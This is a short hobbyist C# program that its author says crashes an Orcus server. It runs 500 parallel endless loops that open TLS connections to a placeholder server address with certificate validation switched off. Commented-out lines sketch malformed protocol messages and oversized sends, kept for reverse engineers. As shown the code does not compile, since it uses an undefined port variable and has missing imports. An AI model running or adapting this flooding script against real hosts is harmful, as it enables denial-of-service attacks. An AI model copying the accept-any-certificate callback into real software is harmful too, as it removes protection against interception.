// I don't really use C#. I wrote this for fun and have no clue what proper C# conventions are. Apologies for the ugly code.

using System;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace application
{
    internal class Program
    {
        private static int iterations;

        public static bool returnTrue(object          sender, X509Certificate certificate, X509Chain chain,
                                      SslPolicyErrors sslPolicyError)
        {
            return true;
        }

        public static void doTheThing()
        {
            var client = new TcpClient();
//            var wait = client.BeginConnect("server-address", port, null, null);
//            wait.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
//            var binaryWriter = new MalformedBinaryWriter(sslStream);
            try
            {

                client.Connect("server-address", port);
                var sslStream = new SslStream(client.GetStream(), true, returnTrue);
                sslStream.AuthenticateAsClient("Hello.");

            }
            catch
            {
            }

            Console.WriteLine("Iteration: " + ++iterations);
//            Turns out you don't even need the rest of this stuff to trigger an Orcus server crash.
//            I'm leaving it in because I consider it potentially useful to an RE.

//            sslStream.Dispose();
//            client.Dispose();
//            sslStream.Write(new byte[] {1}); // server
//            var binaryReader = new BinaryReader(sslStream);
//            var binaryWriter = new MalformedBinaryWriter(sslStream, Encoding.UTF8, true);
//            binaryWriter.Write(9);
//
//            Console.WriteLine("Server: " + binaryReader.ReadByte().ToString()); // status code
//            Console.WriteLine("Server: " + binaryReader.ReadInt32().ToString()); // if invalid version

//            binaryWriter.Write(true); // dunno why it does this

//            var stream = client.GetStream();
//            var socket = (Socket) PrivateValueAccessor.GetPrivateFieldValue(typeof(NetworkStream), "m_StreamSocket", stream);
//            socket.Send(new byte[] { }, 0, 500000, SocketFlags.None);
//
//            string c = new string('z', 300);
//            binaryWriter.WriteBadString(c);
//            Console.WriteLine("Server: " + binaryReader.ReadByte().ToString()); // can accept named pipe?
        }

        public static void Main(string[] args)
        {
          Parallel.For(0, 500, i => {
              while (true) 
                  try 
                  { 
                      doTheThing(); 
                  } 
                  catch (Exception e) 
                  {
                    Console.WriteLine(e.ToString());
                  }
          });
        }
    }
}
